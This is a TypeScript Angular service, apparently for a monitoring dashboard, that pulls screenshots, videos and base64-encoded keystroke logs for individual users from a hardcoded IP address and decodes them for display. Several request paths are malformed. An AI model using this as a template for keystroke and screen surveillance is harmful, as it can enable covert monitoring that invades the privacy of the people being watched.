
import { HttpClient } from "@angular/common/http";
import { Injectable, OnInit } from "@angular/core";
import { BehaviorSubject, Observable } from "rxjs";
import { HexBase64BinaryEncoding } from 'crypto';

export class Keylog
{
  out: string
}
export class Screenshot {
  link: string;
  name: string;
  size: number;
  timestamp: string;
}
export class Media {
  files: Screenshot[];
}
export class User {
  uuid: string;
  company: string;
  sector: string;
  first_name: string;
  middle_name: string;
  last_name: string;
  full_name: string;
  private _photo: string = "";
  get photo(): string {
    return this._photo;
  }
  set photo(value: string) {
    this._photo = ServerService.HOST + value;
    console.log(this._photo);
  }
  role: string;
}
@Injectable({
  providedIn: "root",
})
export class ServerService {
  private msg = new BehaviorSubject<string>(
    "a865b9ef-f553-48e3-8eb3-b7f76c6a8d4f"
  );
  telecast = this.msg.asObservable();
  allusers: User[];
  public HOST = "http://77.37.136.144:8383";
  static HOST: string = "http://77.37.136.144:8383";
  constructor(private http: HttpClient) {}

  getAllUsers() {
    const got = this.http.get(this.HOST + "/users");
    got.subscribe((response: User[]) => {
      this.allusers = response;
    });
    return got;
  }
  editUuid(uuid) {
    this.msg.next(uuid);
  }

  getScreenShotsForUser(uuid: string): Observable<Media> {
    return this.http.get<Media>(
      this.HOST + "user/screenshots?uuid=" + uuid
    );
  }
  getVideosForUser(uuid: string): Observable<Media> {
    return this.http.get<Media>(this.HOST + "user/videos?uuid=" + uuid);
  }
  getKeylogForUser(uuid: string): Observable<Keylog> {
    return this.http.get<Keylog>(this.HOST + "nuser/keylog?uuid=" + uuid);
  }
  decodefrom64  = () => (source: Observable<Keylog>) =>
  new Observable(observer => {
    return source.subscribe({
      next(x) {
        observer.next(
          atob(x.out)
        );
      },
      error(err) { observer.error(err); },
      complete() { observer.complete(); }
    });
  });
}
